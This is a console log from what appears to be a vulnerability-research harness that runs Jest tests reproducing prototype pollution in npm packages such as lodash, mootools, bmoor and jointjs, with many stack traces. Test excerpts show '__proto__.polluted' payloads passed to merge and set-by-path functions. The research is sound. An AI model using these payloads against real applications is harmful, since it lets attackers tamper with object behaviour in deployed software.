b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/set-or-get_1.2.10/set-or-get.test.js']
FAIL set-or-get_1.2.10/set-or-get.test.js
  ✕ prototype pollution in set-or-get (93 ms)

  ● prototype pollution in set-or-get

    ReferenceError: obj is not defined

      3 | test("prototype pollution in set-or-get", () => {
      4 |   var SetOrGet = require("set-or-get");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (set-or-get_1.2.10/set-or-get.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.122 s
Ran all test suites matching /set-or-get_1.2.10\/set-or-get.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'set-or-get_1.2.10/set-or-get.test.js']' returned non-zero exit status 1.
['../prototype-pollution/bmoor_0.8.11/bmoor.test.js']
FAIL bmoor_0.8.11/bmoor.test.js
  ✕ prototype pollution in bmoor (178 ms)

  ● prototype pollution in bmoor

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/bmoor/src/eventing/broadcast.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in bmoor

    TypeError: bmoor.set is not a function

      4 | 
      5 |   const bmoor = require("bmoor");
    > 6 |   bmoor.set({}, "__proto__.polluted", "yes");
        |         ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (bmoor_0.8.11/bmoor.test.js:6:9)

  ● prototype pollution in bmoor

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.223 s
Ran all test suites matching /bmoor_0.8.11\/bmoor.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'bmoor_0.8.11/bmoor.test.js']' returned non-zero exit status 1.
['../prototype-pollution/merge-deep2_3.0.5/merge-deep2.test.js']
PASS merge-deep2_3.0.5/merge-deep2.test.js
  ✓ prototype pollution in merge-deep2 (207 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.24 s
Ran all test suites matching /merge-deep2_3.0.5\/merge-deep2.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/mootools_1.5.2/mootools.test.js']
FAIL mootools_1.5.2/mootools.test.js
  ✕ prototype pollution in mootools (254 ms)

  ● prototype pollution in mootools

    TypeError: Cannot set properties of undefined (setting 'MooTools')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at node_modules/mootools/lib/mootools-core-1.5.2-server.js:25:1
      at Object.<anonymous> (node_modules/mootools/lib/mootools-core-1.5.2-server.js:23:1)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in mootools

    TypeError: Object.merge is not a function

       5 |   expect({}.polluted).toBe(undefined);
       6 | 
    >  7 |   Object.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
         |          ^
       8 | 
       9 |   expect({}.polluted).toBe("yes");
      10 | });

      at Object.<anonymous> (mootools_1.5.2/mootools.test.js:7:10)

  ● prototype pollution in mootools

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.265 s
Ran all test suites matching /mootools_1.5.2\/mootools.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'mootools_1.5.2/mootools.test.js']' returned non-zero exit status 1.
['../prototype-pollution/flattenizer_0.0.5/flattenizer.test.js']
PASS flattenizer_0.0.5/flattenizer.test.js
  ✓ prototype pollution in flattenizer (86 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.129 s
Ran all test suites matching /flattenizer_0.0.5\/flattenizer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'flatten', 'unflatten', 'default' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'unflatten' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/doc-path_2.0.0/doc-path.test.js']
FAIL doc-path_2.0.0/doc-path.test.js
  ✕ prototype pollution in doc-path (33 ms)

  ● prototype pollution in doc-path

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/doc-path/src/path.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in doc-path

    TypeError: path.setPath is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   path.setPath({}, "__proto__.polluted", "yes");
         |        ^
       9 |   expect({}.polluted).toBe("yes");
      10 | });
      11 | 

      at Object.<anonymous> (doc-path_2.0.0/doc-path.test.js:8:8)

  ● prototype pollution in doc-path

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.053 s
Ran all test suites matching /doc-path_2.0.0\/doc-path.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'doc-path_2.0.0/doc-path.test.js']' returned non-zero exit status 1.
['../prototype-pollution/lodash_4.17.9/lodash.test.js']
PASS lodash_4.17.9/lodash.test.js
  ✓ prototype pollution in lodash (814 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.827 s
Ran all test suites matching /lodash_4.17.9\/lodash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 209 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/set-in_1.0.0/set-in.test.js']
PASS set-in_1.0.0/set-in.test.js
  ✓ prototype pollution in set-in (128 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.201 s
Ran all test suites matching /set-in_1.0.0\/set-in.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/nested-property_0.0.5/nested-property.test.js']
PASS nested-property_0.0.5/nested-property.test.js
  ✓ prototype pollution in nested-property (69 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.083 s
Ran all test suites matching /nested-property_0.0.5\/nested-property.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'set', 'get', 'has', 'hasOwn', 'isIn' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/defaults-deep_0.2.4/defaults-deep.test.js']
PASS defaults-deep_0.2.4/defaults-deep.test.js
  ✓ prototype pollution in defaults-deep  (79 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.112 s
Ran all test suites matching /defaults-deep_0.2.4\/defaults-deep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/locutus_2.0.11/locutus.test.js']
PASS locutus_2.0.11/locutus.test.js (5.662 s)
  ✓ prototype pollution in locutus (5059 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.082 s
Ran all test suites matching /locutus_2.0.11\/locutus.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'c', 'golang', 'php', 'python', 'ruby' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'php' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/x-assign_0.1.4/x-assign.test.js']
FAIL x-assign_0.1.4/x-assign.test.js
  ✕ prototype pollution in x-assign (30 ms)

  ● prototype pollution in x-assign

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/x-assign/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in x-assign

    TypeError: XAssign.assign is not a function

       7 |   const a = { red: "apple" };
       8 |   const b = JSON.parse('{"__proto__": {"polluted": "yes"}}');
    >  9 |   const c = XAssign.assign(a, b);
         |                     ^
      10 | 
      11 |   expect({}.polluted).toBe("yes");
      12 | });

      at Object.<anonymous> (x-assign_0.1.4/x-assign.test.js:9:21)

  ● prototype pollution in x-assign

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.048 s
Ran all test suites matching /x-assign_0.1.4\/x-assign.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'x-assign_0.1.4/x-assign.test.js']' returned non-zero exit status 1.
['../prototype-pollution/merge-objects_1.0.3/merge-objects.test.js']
FAIL merge-objects_1.0.3/merge-objects.test.js
  ✕ prototype pollution in merge-objects (38 ms)

  ● prototype pollution in merge-objects

    ReferenceError: obj is not defined

      4 |   const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
      5 | 
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (merge-objects_1.0.3/merge-objects.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.071 s
Ran all test suites matching /merge-objects_1.0.3\/merge-objects.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'merge-objects_1.0.3/merge-objects.test.js']' returned non-zero exit status 1.
['../prototype-pollution/asciitable.js_1.0.2/asciitable.test.js']
PASS asciitable.js_1.0.2/asciitable.test.js
  ✓ Prototype pollution in asciitable.js (77 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.107 s
Ran all test suites matching /asciitable.js_1.0.2\/asciitable.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/merge_2.1.0/merge.test.js']
PASS merge_2.1.0/merge.test.js
  ✓ prototype pollution in merge (69 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.1 s
Ran all test suites matching /merge_2.1.0\/merge.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'default',\n      'main',\n      'clone',\n      'isPlainObject',\n      'recursive',\n      'merge',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'recursive' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/objnest_5.0.0/objnest.test.js']
FAIL objnest_5.0.0/objnest.test.js
  ✕ prototype pollution in objnest (60 ms)

  ● prototype pollution in objnest

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/objnest/lib/objnest.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in objnest

    TypeError: objnest.expand is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   objnest.expand({ "__proto__.polluted": "yes" });
         |           ^
       9 |   expect({}.polluted).toBe("yes");
      10 | });
      11 | 

      at Object.<anonymous> (objnest_5.0.0/objnest.test.js:8:11)

  ● prototype pollution in objnest

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.094 s
Ran all test suites matching /objnest_5.0.0\/objnest.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'objnest_5.0.0/objnest.test.js']' returned non-zero exit status 1.
['../prototype-pollution/flat_5.0.0/flat.test.js']
PASS flat_5.0.0/flat.test.js
  ✓ prototype pollution in flat (81 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.069 s
Ran all test suites matching /flat_5.0.0\/flat.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'flatten', 'unflatten', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'unflatten' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 6, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/safe-obj_1.0.0/safe-obj.test.js']
FAIL safe-obj_1.0.0/safe-obj.test.js
  ✕ prototype pollution in safeObj (84 ms)

  ● prototype pollution in safeObj

    TypeError: Cannot read properties of undefined (reading '_')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at node_modules/safe-obj/lib/index.js:163:17
      at Object.<anonymous> (node_modules/safe-obj/lib/index.js:1:2)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in safeObj

    ReferenceError: obj is not defined

      3 | test("prototype pollution in safeObj", () => {
      4 |   var safeObj = require("safe-obj");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (safe-obj_1.0.0/safe-obj.test.js:5:6)

  ● prototype pollution in safeObj

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.095 s
Ran all test suites matching /safe-obj_1.0.0\/safe-obj.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'safe-obj_1.0.0/safe-obj.test.js']' returned non-zero exit status 1.
['../prototype-pollution/pathval_1.1.0/pathval.test.js']
PASS pathval_1.1.0/pathval.test.js
  ✓ prototype pollution in pathval (71 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.098 s
Ran all test suites matching /pathval_1.1.0\/pathval.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'hasProperty', 'getPathInfo', 'getPathValue', 'setPathValue' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'setPathValue' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/jointjs_3.4.0/jointjs.test.js']
FAIL jointjs_3.4.0/jointjs.test.js
  ✕ prototype pollution in jointjs (4115 ms)

  ● prototype pollution in jointjs

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at t (jointjs_3.4.0/node_modules/jointjs/dist/joint.min.js:8:2934)
      at n (jointjs_3.4.0/node_modules/jointjs/dist/joint.min.js:8:572)
      at e (jointjs_3.4.0/node_modules/jointjs/dist/joint.min.js:8:2920)
      at Object.<anonymous>.g (jointjs_3.4.0/node_modules/jointjs/dist/joint.min.js:8:71)
      at Object.<anonymous> (jointjs_3.4.0/node_modules/jointjs/dist/joint.min.js:8:4)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in jointjs

    TypeError: Cannot read properties of undefined (reading 'setByPath')

      4 | 
      5 |   const jointjs = require("jointjs");
    > 6 |   jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");
        |                ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (jointjs_3.4.0/jointjs.test.js:6:16)

  ● prototype pollution in jointjs

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        5.152 s
Ran all test suites matching /jointjs_3.4.0\/jointjs.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
